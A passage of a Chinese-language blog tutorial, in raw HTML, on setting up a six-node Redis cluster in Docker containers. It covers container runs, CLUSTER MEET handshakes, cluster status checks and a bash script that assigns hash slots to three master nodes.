3</code><code>/3</code> <code>: ENTRYPOINT </code><code>/usr/local/redis/redis-server</code> <code>/usr/local/redis/redis</code><code>.conf</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; Running </code><code>in</code> <code>f5dedf88f6f6</code></p>\n\n\t\t\t\t<p><code> </code><code>---&gt; da64da483559</code></p>\n\n\t\t\t\t<p><code>Removing intermediate container f5dedf88f6f6</code></p>\n\n\t\t\t\t<p><code>Successfully built da64da483559</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\t</li>\n\t<li>查看镜像\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker images</code></p>\n\n\t\t\t\t<p><code>REPOSITORY                                  TAG                 IMAGE ID            CREATED             SIZE</code></p>\n\n\t\t\t\t<p><code>hakimdstx</code><code>/nodes-redis</code>                       <code>4.0.1               da64da483559        51 seconds ago      435 MB</code></p>\n\n\t\t\t\t<p><code>hakimdstx</code><code>/cluster-redis</code>                     <code>4.0.1               1fca5a08a4c7        9 minutes ago       435 MB</code></p>\n\n\t\t\t\t<p><code>centos                                      7                   49f7960eb7e4        2 days ago          200 MB</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\t</li>\n</ol><h1>三、运行redis集群</h1>\n\n<ol><li>运行redis容器\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker run -d --name redis-6379 -p 6379:6379 hakimdstx/nodes-redis:4.0.1  </code></p>\n\n\t\t\t\t<p><code>1673a7d859ea83257d5bf14d82ebf717fb31405c185ce96a05f597d8f855aa7d</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker run -d --name redis-6380 -p 6380:6379 hakimdstx/nodes-redis:4.0.1   </code></p>\n\n\t\t\t\t<p><code>df6ebce6f12a6f3620d5a29adcfbfa7024e906c3af48f21fa7e1fa524a361362</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker run -d --name redis-6381 -p 6381:6379 hakimdstx/nodes-redis:4.0.1  </code></p>\n\n\t\t\t\t<p><code>396e174a1d9235228b3c5f0266785a12fb1ea49efc7ac755c9e7590e17aa1a79</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker run -d --name redis-6382 -p 6382:6379 hakimdstx/nodes-redis:4.0.1</code></p>\n\n\t\t\t\t<p><code>d9a71dd3f969094205ffa7596c4a04255575cdd3acca2d47fe8ef7171a3be528</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker run -d --name redis-6383 -p 6383:6379 hakimdstx/nodes-redis:4.0.1</code></p>\n\n\t\t\t\t<p><code>73e4f843d8cb28595456e21b04f97d18ce1cdf8dc56d1150844ba258a3781933</code></p>\n\n\t\t\t\t<p><code>[root@etcd3 docker_redis_nodes]</code><code># docker run -d --name redis-6384 -p 6384:6379 hakimdstx/nodes-redis:4.0.1</code></p>\n\n\t\t\t\t<p><code>10c62aafa4dac47220daf5bf3cec84406f086d5261599b54ec6c56bb7da97d6d</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table></li>\n\t<li>查看容器信息\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>[root@etcd3 redis]</code><code># docker ps</code></p>\n\n\t\t\t\t<p><code>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES</code></p>\n\n\t\t\t\t<p><code>10c62aafa4da        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 seconds ago       Up 2 seconds        0.0.0.0:6384-&gt;6379</code><code>/tcp</code>   <code>redis-6384</code></p>\n\n\t\t\t\t<p><code>73e4f843d8cb        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>12 seconds ago      Up 10 seconds       0.0.0.0:6383-&gt;6379</code><code>/tcp</code>   <code>redis-6383</code></p>\n\n\t\t\t\t<p><code>d9a71dd3f969        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>20 seconds ago      Up 18 seconds       0.0.0.0:6382-&gt;6379</code><code>/tcp</code>   <code>redis-6382</code></p>\n\n\t\t\t\t<p><code>396e174a1d92        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 days ago          Up 3 days           0.0.0.0:6381-&gt;6379</code><code>/tcp</code>   <code>redis-6381</code></p>\n\n\t\t\t\t<p><code>df6ebce6f12a        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 days ago          Up 3 days           0.0.0.0:6380-&gt;6379</code><code>/tcp</code>   <code>redis-6380</code></p>\n\n\t\t\t\t<p><code>1673a7d859ea        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 days ago          Up 3 days           0.0.0.0:6379-&gt;6379</code><code>/tcp</code>   <code>redis-6379</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　</p>\n\t</li>\n\t<li>运行 redis 集群容器\n\t<ol><li>通过远程连接，查看redis  info replication 信息\n\t\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t\t<p>1</p>\n\n\t\t\t\t\t<p>2</p>\n\n\t\t\t\t\t<p>3</p>\n\n\t\t\t\t\t<p>4</p>\n\n\t\t\t\t\t<p>5</p>\n\n\t\t\t\t\t<p>6</p>\n\n\t\t\t\t\t<p>7</p>\n\n\t\t\t\t\t<p>8</p>\n\n\t\t\t\t\t<p>9</p>\n\n\t\t\t\t\t<p>10</p>\n\n\t\t\t\t\t<p>11</p>\n\n\t\t\t\t\t<p>12</p>\n\n\t\t\t\t\t<p>13</p>\n\n\t\t\t\t\t<p>14</p>\n\n\t\t\t\t\t<p>15</p>\n\n\t\t\t\t\t<p>16</p>\n\n\t\t\t\t\t<p>17</p>\n\n\t\t\t\t\t<p>18</p>\n\n\t\t\t\t\t<p>19</p>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t<p><code>[root@etcd2 ~]</code><code>#  redis-cli -h 192.168.10.52 -p 6379</code></p>\n\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt; info replication</code></p>\n\n\t\t\t\t\t<p><code>NOAUTH Authentication required.</code></p>\n\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt; auth 123456</code></p>\n\n\t\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt; info replication</code></p>\n\n\t\t\t\t\t<p><code># Replication</code></p>\n\n\t\t\t\t\t<p><code>role:master</code></p>\n\n\t\t\t\t\t<p><code>connected_slaves:0</code></p>\n\n\t\t\t\t\t<p><code>master_replid:2f0a7b50aed699fa50a79f3f7f9751a070c50ee9</code></p>\n\n\t\t\t\t\t<p><code>master_replid2:0000000000000000000000000000000000000000</code></p>\n\n\t\t\t\t\t<p><code>master_repl_offset:0</code></p>\n\n\t\t\t\t\t<p><code>second_repl_offset:-1</code></p>\n\n\t\t\t\t\t<p><code>repl_backlog_active:0</code></p>\n\n\t\t\t\t\t<p><code>repl_backlog_size:1048576</code></p>\n\n\t\t\t\t\t<p><code>repl_backlog_first_byte_offset:0</code></p>\n\n\t\t\t\t\t<p><code>repl_backlog_histlen:0</code></p>\n\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt;</code></p>\n\n\t\t\t\t\t<p><code># 其余基本信息同上</code></p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr></tbody></table><p>　　可以看到，客户连接之后，因为之前设置了密码，所以需要先输入密码认证，否则就无法通过。以上信息，我们知道所有的redis都是master角色 role:master ，这显然不是我们所希望的。</p>\n\t\t</li>\n\t\t<li>在配置之前我们需要查看所有容器当前的IP地址\n\t\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t\t<p>1</p>\n\n\t\t\t\t\t<p>2</p>\n\n\t\t\t\t\t<p>3</p>\n\n\t\t\t\t\t<p>4</p>\n\n\t\t\t\t\t<p>5</p>\n\n\t\t\t\t\t<p>6</p>\n\n\t\t\t\t\t<p>7</p>\n\n\t\t\t\t\t<p>8</p>\n\n\t\t\t\t\t<p>9</p>\n\n\t\t\t\t\t<p>10</p>\n\n\t\t\t\t\t<p>11</p>\n\n\t\t\t\t\t<p>12</p>\n\n\t\t\t\t\t<p>13</p>\n\n\t\t\t\t\t<p>14</p>\n\n\t\t\t\t\t<p>15</p>\n\n\t\t\t\t\t<p>16</p>\n\n\t\t\t\t\t<p>17</p>\n\n\t\t\t\t\t<p>18</p>\n\n\t\t\t\t\t<p>19</p>\n\n\t\t\t\t\t<p>20</p>\n\n\t\t\t\t\t<p>21</p>\n\n\t\t\t\t\t<p>22</p>\n\n\t\t\t\t\t<p>23</p>\n\n\t\t\t\t\t<p>24</p>\n\n\t\t\t\t\t<p>25</p>\n\n\t\t\t\t\t<p>26</p>\n\n\t\t\t\t\t<p>27</p>\n\n\t\t\t\t\t<p>28</p>\n\n\t\t\t\t\t<p>29</p>\n\n\t\t\t\t\t<p>30</p>\n\n\t\t\t\t\t<p>31</p>\n\n\t\t\t\t\t<p>32</p>\n\n\t\t\t\t\t<p>33</p>\n\n\t\t\t\t\t<p>34</p>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t<p><code>[root@etcd3 redis]</code><code># docker ps</code></p>\n\n\t\t\t\t\t<p><code>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES</code></p>\n\n\t\t\t\t\t<p><code>10c62aafa4da        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 seconds ago       Up 2 seconds        0.0.0.0:6384-&gt;6379</code><code>/tcp</code>   <code>redis-6384</code></p>\n\n\t\t\t\t\t<p><code>73e4f843d8cb        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>12 seconds ago      Up 10 seconds       0.0.0.0:6383-&gt;6379</code><code>/tcp</code>   <code>redis-6383</code></p>\n\n\t\t\t\t\t<p><code>d9a71dd3f969        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>20 seconds ago      Up 18 seconds       0.0.0.0:6382-&gt;6379</code><code>/tcp</code>   <code>redis-6382</code></p>\n\n\t\t\t\t\t<p><code>396e174a1d92        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 days ago          Up 3 days           0.0.0.0:6381-&gt;6379</code><code>/tcp</code>   <code>redis-6381</code></p>\n\n\t\t\t\t\t<p><code>df6ebce6f12a        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 days ago          Up 3 days           0.0.0.0:6380-&gt;6379</code><code>/tcp</code>   <code>redis-6380</code></p>\n\n\t\t\t\t\t<p><code>1673a7d859ea        hakimdstx</code><code>/nodes-redis</code><code>:4.0.1   </code><code>\"/usr/local/redis/...\"</code>   <code>3 days ago          Up 3 days           0.0.0.0:6379-&gt;6379</code><code>/tcp</code>   <code>redis-6379</code></p>\n\n\t\t\t\t\t<p><code>[root@etcd3 redis]</code><code>#</code></p>\n\n\t\t\t\t\t<p><code>[root@etcd3 redis]</code><code># docker inspect 10c62aafa4da 73e4f843d8cb d9a71dd3f969 396e174a1d92 df6ebce6f12a 1673a7d859ea | grep IPA</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"SecondaryIPAddresses\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.7\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAMConfig\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.7\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"SecondaryIPAddresses\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.6\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAMConfig\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.6\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"SecondaryIPAddresses\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.5\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAMConfig\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.5\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"SecondaryIPAddresses\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.4\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAMConfig\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.4\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"SecondaryIPAddresses\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.3\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAMConfig\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.3\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"SecondaryIPAddresses\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>            </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.2\"</code><code>,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAMConfig\"</code><code>: null,</code></p>\n\n\t\t\t\t\t<p><code>                    </code><code>\"IPAddress\"</code><code>: </code><code>\"172.17.0.2\"</code><code>,</code></p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr></tbody></table>\n\t\t \n\n\t\t<p>可以知道：  redis-6379：172.17.0.2，redis-6380：172.17.0.3，redis-6381：172.17.0.4，redis-6382：172.17.0.5，redis-6383：172.17.0.6，redis-6384：172.17.0.7  </p>\n\t\t</li>\n\t\t<li>配置redis</li>\n\t\t<li>ert</li>\n\t</ol></li>\n\t<li>Redis Cluster 的集群感知操作\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\n\t\t\t\t<p>18</p>\n\n\t\t\t\t<p>19</p>\n\n\t\t\t\t<p>20</p>\n\n\t\t\t\t<p>21</p>\n\n\t\t\t\t<p>22</p>\n\n\t\t\t\t<p>23</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>//</code><code>集群(cluster) </code></p>\n\n\t\t\t\t<p><code>CLUSTER INFO 打印集群的信息 </code></p>\n\n\t\t\t\t<p><code>CLUSTER NODES 列出集群当前已知的所有节点（node），以及这些节点的相关信息。  </code></p>\n\n\t\t\t\t<p><code>  </code> </p>\n\n\t\t\t\t<p><code>//</code><code>节点(node) </code></p>\n\n\t\t\t\t<p><code>CLUSTER MEET &lt;ip&gt; &lt;port&gt; 将 ip 和 port 所指定的节点添加到集群当中，让它成为集群的一份子。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER FORGET &lt;node_id&gt; 从集群中移除 node_id 指定的节点。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER REPLICATE &lt;node_id&gt; 将当前节点设置为 node_id 指定的节点的从节点。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER SAVECONFIG 将节点的配置文件保存到硬盘里面。  </code></p>\n\n\t\t\t\t<p><code>  </code> </p>\n\n\t\t\t\t<p><code>//</code><code>槽(slot) </code></p>\n\n\t\t\t\t<p><code>CLUSTER ADDSLOTS &lt;slot&gt; [slot ...] 将一个或多个槽（slot）指派（assign）给当前节点。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER DELSLOTS &lt;slot&gt; [slot ...] 移除一个或多个槽对当前节点的指派。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER FLUSHSLOTS 移除指派给当前节点的所有槽，让当前节点变成一个没有指派任何槽的节点。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER SETSLOT &lt;slot&gt; NODE &lt;node_id&gt; 将槽 slot 指派给 node_id 指定的节点，如果槽已经指派给另一个节点，那么先让另一个节点删除该槽&gt;，然后再进行指派。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER SETSLOT &lt;slot&gt; MIGRATING &lt;node_id&gt; 将本节点的槽 slot 迁移到 node_id 指定的节点中。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER SETSLOT &lt;slot&gt; IMPORTING &lt;node_id&gt; 从 node_id 指定的节点中导入槽 slot 到本节点。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER SETSLOT &lt;slot&gt; STABLE 取消对槽 slot 的导入（</code><code>import</code><code>）或者迁移（migrate）。  </code></p>\n\n\t\t\t\t<p><code>  </code> </p>\n\n\t\t\t\t<p><code>//</code><code>键 (key) </code></p>\n\n\t\t\t\t<p><code>CLUSTER KEYSLOT &lt;key&gt; 计算键 key 应该被放置在哪个槽上。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER COUNTKEYSINSLOT &lt;slot&gt; 返回槽 slot 目前包含的键值对数量。 </code></p>\n\n\t\t\t\t<p><code>CLUSTER GETKEYSINSLOT &lt;slot&gt; &lt;count&gt; 返回 count 个 slot 槽中的键。 </code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\tredis 集群感知：节点握手——是指一批运行在集群模式的节点通过<code>Gossip</code>协议彼此通信，达到感知对方的过程。<br>\n\t </p>\n\n\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t<p>1</p>\n\n\t\t\t\t<p>2</p>\n\n\t\t\t\t<p>3</p>\n\n\t\t\t\t<p>4</p>\n\n\t\t\t\t<p>5</p>\n\n\t\t\t\t<p>6</p>\n\n\t\t\t\t<p>7</p>\n\n\t\t\t\t<p>8</p>\n\n\t\t\t\t<p>9</p>\n\n\t\t\t\t<p>10</p>\n\n\t\t\t\t<p>11</p>\n\n\t\t\t\t<p>12</p>\n\n\t\t\t\t<p>13</p>\n\n\t\t\t\t<p>14</p>\n\n\t\t\t\t<p>15</p>\n\n\t\t\t\t<p>16</p>\n\n\t\t\t\t<p>17</p>\n\t\t\t\t</td>\n\t\t\t\t<td>\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER MEET 172.17.0.3 6379</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER MEET 172.17.0.4 6379</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER MEET 172.17.0.5 6379</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER MEET 172.17.0.6 6379</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER MEET 172.17.0.7 6379</code></p>\n\n\t\t\t\t<p><code>OK</code></p>\n\n\t\t\t\t<p><code>192.168.10.52:6379&gt;  CLUSTER NODES</code></p>\n\n\t\t\t\t<p><code>54cb5c2eb8e5f5aed2d2f7843f75a9284ef6785c 172.17.0.3:6379@16379 master - 0 1528697195600 1 connected</code></p>\n\n\t\t\t\t<p><code>f45f9109f2297a83b1ac36f9e1db5e70bbc174ab 172.17.0.4:6379@16379 master - 0 1528697195600 0 connected</code></p>\n\n\t\t\t\t<p><code>ae86224a3bc29c4854719c83979cb7506f37787a 172.17.0.7:6379@16379 master - 0 1528697195600 5 connected</code></p>\n\n\t\t\t\t<p><code>98aebcfe42d8aaa8a3375e4a16707107dc9da683 172.17.0.6:6379@16379 master - 0 1528697194000 4 connected</code></p>\n\n\t\t\t\t<p><code>0bbdc4176884ef0e3bb9b2e7d03d91b0e7e11f44 172.17.0.5:6379@16379 master - 0 1528697194995 3 connected</code></p>\n\n\t\t\t\t<p><code>760e4d0039c5ac13d04aa4791c9e6dc28544d7c7 172.17.0.2:6379@16379 myself,master - 0 1528697195000 2 connected</code></p>\n\t\t\t\t</td>\n\t\t\t</tr></tbody></table><p>　　<br>\n\t当前已经使这六个节点组成集群，但是现在还无法工作，因为集群节点还没有分配槽（slot）。</p>\n\n\t<ol><li>分配槽信息<br>\n\t\t查看172.17.0.2:6379 的槽个数\n\t\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t\t<p>1</p>\n\n\t\t\t\t\t<p>2</p>\n\n\t\t\t\t\t<p>3</p>\n\n\t\t\t\t\t<p>4</p>\n\n\t\t\t\t\t<p>5</p>\n\n\t\t\t\t\t<p>6</p>\n\n\t\t\t\t\t<p>7</p>\n\n\t\t\t\t\t<p>8</p>\n\n\t\t\t\t\t<p>9</p>\n\n\t\t\t\t\t<p>10</p>\n\n\t\t\t\t\t<p>11</p>\n\n\t\t\t\t\t<p>12</p>\n\n\t\t\t\t\t<p>13</p>\n\n\t\t\t\t\t<p>14</p>\n\n\t\t\t\t\t<p>15</p>\n\n\t\t\t\t\t<p>16</p>\n\n\t\t\t\t\t<p>17</p>\n\n\t\t\t\t\t<p>18</p>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t<p><code>192.168.10.52:6379&gt; CLUSTER INFO</code></p>\n\n\t\t\t\t\t<p><code>cluster_state:fail</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_assigned:0    </code><code># 被分配槽的个数为0</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_ok:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_pfail:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_slots_fail:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_known_nodes:6</code></p>\n\n\t\t\t\t\t<p><code>cluster_size:0</code></p>\n\n\t\t\t\t\t<p><code>cluster_current_epoch:5</code></p>\n\n\t\t\t\t\t<p><code>cluster_my_epoch:2</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_ping_sent:260418</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_pong_sent:260087</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_meet_sent:10</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_sent:520515</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_ping_received:260086</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_pong_received:260328</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_meet_received:1</code></p>\n\n\t\t\t\t\t<p><code>cluster_stats_messages_received:520415</code></p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr></tbody></table><p>　　<br>\n\t\t上面看到集群状态是失败的，原因是槽位没有分配，而且需要一次性把16384个槽位完全分配了，集群才可用。</p>\n\t\t</li>\n\t\t<li>\n\t\t<p>分配槽位</p>\n\t\t分配槽位： CLUSTER ADDSLOTS  槽位，一个槽位只能分配一个节点，16384个槽位必须分配完，不同节点不能冲突。<br>\n\t\t所以通过脚本进行分配 addslots.sh：\n\t\t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t\t\t<p>1</p>\n\n\t\t\t\t\t<p>2</p>\n\n\t\t\t\t\t<p>3</p>\n\n\t\t\t\t\t<p>4</p>\n\n\t\t\t\t\t<p>5</p>\n\n\t\t\t\t\t<p>6</p>\n\n\t\t\t\t\t<p>7</p>\n\n\t\t\t\t\t<p>8</p>\n\n\t\t\t\t\t<p>9</p>\n\n\t\t\t\t\t<p>10</p>\n\n\t\t\t\t\t<p>11</p>\n\n\t\t\t\t\t<p>12</p>\n\n\t\t\t\t\t<p>13</p>\n\n\t\t\t\t\t<p>14</p>\n\n\t\t\t\t\t<p>15</p>\n\n\t\t\t\t\t<p>16</p>\n\n\t\t\t\t\t<p>17</p>\n\n\t\t\t\t\t<p>18</p>\n\n\t\t\t\t\t<p>19</p>\n\n\t\t\t\t\t<p>20</p>\n\n\t\t\t\t\t<p>21</p>\n\n\t\t\t\t\t<p>22</p>\n\n\t\t\t\t\t<p>23</p>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td>\n\t\t\t\t\t<p><code>#!/bin/bash</code></p>\n\n\t\t\t\t\t<p><code># node1 192.168.10.52   172.17.0.2</code></p>\n\n\t\t\t\t\t<p><code>n=0</code></p>\n\n\t\t\t\t\t<p><code>for</code> <code>((i=n;i&lt;=5461;i++))</code></p>\n\n\t\t\t\t\t<p><code>do</code></p>\n\n\t\t\t\t\t<p><code>   </code><code>/usr/local/bin/redis-cli</code> <code>-h 192.168.10.52 -p 6379 -a 123456  CLUSTER ADDSLOTS $i</code></p>\n\n\t\t\t\t\t<p><code>done</code></p>\n\n\t\t\t\t\t<p> </p>\n\n\t\t\t\t\t<p> </p>\n\n\t\t\t\t\t<p><code># node2 192.168.10.52    172.17.0.3</code></p>\n\n\t\t\t\t\t<p><code>n=5462</code></p>\n\n\t\t\t\t\t<p><code>for</code> <code>((i=n;i&lt;=10922;i++))</code></p>\n\n\t\t\t\t\t<p><code>do</code></p>\n\n\t\t\t\t\t<p><code>   </code><code>/usr/local/bin/redis-cli</code> <code>-h 192.168.10.52 -p 6380 -a 123456 CLUSTER ADDSLOTS $i</code></p>\n\n\t\t\t\t\t<p><code>done</code></p>\n\n\t\t\t\t\t<p> </p>\n\n\t\t\t\t\t<p> </p>\n\n\t\t\t\t\t<p><code># node3 192.168.10.52    172.17.0.4</code></p>\n\n\t\t\t\t\t<p><code>n=10923</code></p>\n\n\t\t\t\t\t<p><code>for</code> <code>((i=n;i&lt;=16383;i++))</code></p>\n\n\t\t\t\t\t<p><code>do</code></p>\n\n\t\t\t\t\t<p><code>   </code><code>/usr/local/bin/redis-cli</code> <code>-h 192.168.10.52 -p 6381 -a 123456 CLUSTER ADDSLOTS $i</code></p>\n\n\t\t\t\t\t<p><code>done</code></p>\n\t\t\t\t\t</td>\n\t\t\t\t</tr></tbody></table><p>　　<br>\n\t\t其中， -a 123456  表示需要输入的密码。</p>\n\n\t\t<table border=\"0\" cellpadding=\"0\" 